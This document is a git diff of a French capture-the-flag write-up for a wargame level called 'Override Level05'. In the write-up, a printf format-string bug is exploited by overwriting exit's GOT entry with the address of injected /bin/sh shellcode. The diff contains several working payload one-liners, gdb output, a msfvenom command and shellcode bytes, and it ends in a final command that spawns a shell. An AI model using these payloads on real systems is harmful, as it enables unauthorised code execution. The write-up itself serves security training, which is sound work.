@@ -1,62 +1,70 @@
-https://samsclass.info/127/proj/ED204c.htm
+# Override / Level05
+
+
+## Lire le fichier level05
+
+On explore le fichier avec dogbolt et on peut voir cette ligne:
+
+`printf(s);`
+
 Ca l air d etre juste une string vulnerability.
-Juste rewrite sur exit l adresse du shellcode
+
+## Exploit
+
+Le printf vulnerability a deja ete vu dans Rainfall mais pour resume le %n permet d ecrire le nombre de caracteres dans le printf en memoire donne.
+
+https://samsclass.info/127/proj/ED204c.htm
+
+```
 (python -c 'print "\xe0\x97\x04\x08JUNK\xe4\x97\x04\x08.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n.%x.%n"')
 Program received signal SIGSEGV, Segmentation fault.
 0x00000042 in ?? ()
 (gdb) x/1x 0x080497e0
 0x80497e0 <exit@got.plt>:	0x00000042
+```
+On a juste a ecrire un shellcode /bin/sh puis ecrire sur la memoire de exit l'adresse de notre shellcode.
 
-// Things to change in the shellcode because of this line  s[i] ^= 0x20u;
+## Difficultes.
 
-// Probleme => 0x50 qui equivaut a push eax se transforme en 0x70 => Solution? On utilise un outil qui s appelle msf venom avec le flag -b.
+- Pas assez de place pour le shellcode.
 
-msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"
+- `s[i] ^= 0x20u;` qui change notre shellcode.
 
-"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
-"\x0e\x91\xf6\xf2\x0f\x83\xee\xfc\xe2\xf4\xfb\xfd\xaa\x96"
-"\xc3\x90\x9a\x22\xf2\x7f\x15\x67\xbe\x85\x9a\x0f\xf9\xd9"
-"\x90\x66\xff\x7f\x11\x5d\x79\xfe\xf2\x0f\x91\xd9\x90\x66"
-"\xff\xd9\x81\x67\x91\xa1\xa1\x86\x70\x3b\x72\x0f"
+## Solutions.
 
-"\x33\xc9\xb1\x0b\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xcc\xd6\xf1\xff\x83\xeb\xfc\xe2\xf4\xa6\xdd\xa9\x66\x9e\xb0\x99\xd2\xaf\x5f\x16\x97\xe3\xa5\x99\xff\xa4\xf9\x93\x96\xa2\x5f\x12\xad\x24\xde\xf1\xff\xcc\xf9\x93\x96\xa2\xf9\x82\x97\xcc\x81\xa2\x76\x2d\x1b\x71\xff"
+Pour le nombre de place, j'ai utilisé %hn qui au lieu d'ecrire sur un byte a la fois il ecrit sur 2 bytes.
+Ce la permet de passer  de 
 
-=> ce shellcode fonctionne mtn faut l utiliser pour le printf();
+`(python -c 'print "\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08JUNK\xe3\x97\x04\x08JUNK\xe4\x97\x04\x08%x%x%x%x%x%x%x%x%x%n%x.%n.%n%x"')` 
 
-$(python -c 'print "\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08%x%x%x%x%x%x%x%x%101x%hn%34x%hn"+ "\x90" * 3 + "\x33\xc9\xb1\x0b\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xcc\xd6\xf1\xff\x83\xeb\xfc\xe2\xf4\xa6\xdd\xa9\x66\x9e\xb0\x99\xd2\xaf\x5f\x16\x97\xe3\xa5\x99\xff\xa4\xf9\x93\x96\xa2\x5f\x12\xad\x24\xde\xf1\xff\xcc\xf9\x93\x96\xa2\xf9\x82\x97\xcc\x81\xa2\x76\x2d\x1b\x71\xff"')
+à 
 
-// shellcode en cours, autre soucis pas assez de place pour mettre le shellcode en entier
+`(python -c 'print \xe0\x97\x04\x08junk\xe2\x97\x04\x08%x%x%x%x%x%x%x%x%x%hn%x%hn"')`
 
-"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" autre shellcode a tester sur un autre niveau
+On prend aussi un shellcode plus petit donc celui la:
+
+`\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80`
+
+Maintenant le seul soucis est le \x51 qui va etre transforme en \x71. Mais comme on peut ecrire sur la memoire avec %hn on va utilise cette technique pour ecrire \x51 sur l emplacement memoire du shellcode correspondant.
+
+`run <<< $(python -c 'print "\xc5\xd6\xff\xffjunk\xe0\x97\x04\x08junk\xe2\x97\x04\x08" + "%x%x%x%x%x%x%x%x%26634x%hn%28270x%hn%76096x%hn" + "\x90" * 5 + "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80"')`
+
+Avec cette command on ecrit sur la memoire de notre shellcode situe a ffffd6c5. 
+
+![Légende](img.png)
 
 
-// soucis => ce shellcode contient un byte null.
-=> Solution: on a remplace le 00 par 2f.
+![Légende](img2.png)
 
-run <<< $(python -c 'print "dat_will" + "\x90" * 19 + "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80"';python -c 'print "A" *  282 + "\x50\xa0\x04\x08"';)
+Cela marche!
 
-
-"\x6a\x0b\x58\x68\x2f\x73\x68\x2f\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
-
- run <<< $(python -c 'print "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80" + "\x7e\xd6\xff\xff\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%79x%hhn%hn%100x%hf"')
-
-=> commande a modifier un peu pour overwrite sur le exit proprement 
-=> go le tranformer en ffffd6bf
-=> Ne pas mettre de junk car on depasse les 100 caracteres
-=> On depasse les 100 caracteres trouvez une solution.
-=> solution mettre le shellcode en avance
-run <<< $(python -c 'print "\xc5\xd6\xff\xffjunk\xe0\x97\x04\x08junk\xe2\x97\x04\x08" + "%x%x%x%x%x%x%x%x%26634x%hn%28270x%hn%76096x%hn" + "\x90" * 5 + "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80"')
-
-run <<< $(python -c 'print "\xe5\xd6\xff\xffjunk\xe0\x97\x04\x08junk\xe2\x97\x04\x08" + "%x%x%x%x%x%x%x%x%26634x%hn%28270x%hn%76096x%hn" + "\x90" * 5 + "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80"')
+On peut maintenant ecrire sur la memoire de exit.
 
 cela ouvre un bin/dash sur gdb!
 
-=> Regarder sur lvl02 ou se trouve la vraie memoire dans le term 
-=> Il ya 0x20 de diff entre la memoire de gdb et la memoire normale
+Il ya 0x20 de diff entre la memoire de gdb et la memoire normale
 
 \xc5\xd6\xff\xff => doit etre \xe5\xd6\xff\xff
 et pour ffffd6bf => ffffd6df
 
-(python -c 'print "\xe5\xd6\xff\xffjunk\xe0\x97\x04\x08junk\xe2\x97\x04\x08" + "%x%x%x%x%x%x%x%x%26634x%hn%28302x%hn%76064x%hn" + "\x90" * 5 + "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80"';cat) | ./level05
-
-VOILA LA SOLUTION
+> (python -c 'print "\xe5\xd6\xff\xffjunk\xe0\x97\x04\x08junk\xe2\x97\x04\x08" + "%x%x%x%x%x%x%x%x%26634x%hn%28302x%hn%76064x%hn" + "\x90" * 5 + "\x31\xc0\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\xb0\x0b\xcd\x80"';cat) | ./level05
